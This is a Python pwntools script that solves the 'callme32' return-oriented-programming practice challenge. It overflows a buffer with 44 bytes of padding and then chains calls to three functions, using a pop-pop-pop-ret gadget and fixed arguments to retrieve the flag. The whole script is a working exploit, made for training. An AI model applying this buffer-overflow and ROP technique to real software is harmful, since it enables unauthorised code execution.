from pwn import * 


callme32 = ELF("./callme32")

# load address of callme_one, callme_two, callme_three

callme_one = p32(callme32.symbols['callme_one']) 
callme_two = p32(callme32.symbols['callme_two'])
callme_three = p32(callme32.symbols['callme_three'])

p = process('./callme32')


pop_3_val =  p32(0x080487f9) # pop esi;pop edi;pop epb;ret;   found with rooper -f callme32 --search pop
# once we called calleme_one() we need to pop arguments and end with a ret in order to call callme_two and callme_three
arguments = p32(0xdeadbeef) +  p32(0xcafebabe)  +p32(0xd00df00d)

# payload
pad = b'A'*44
rop_chain = pad + callme_one +   pop_3_val + arguments
rop_chain += callme_two + pop_3_val + arguments 
rop_chain += callme_three + pop_3_val + arguments

p.sendlineafter(b'>', rop_chain)

flag = p.recvall().split(b'\n')[3].decode()
log.success("CALLME32 FLAG: " +  flag)
p.close()



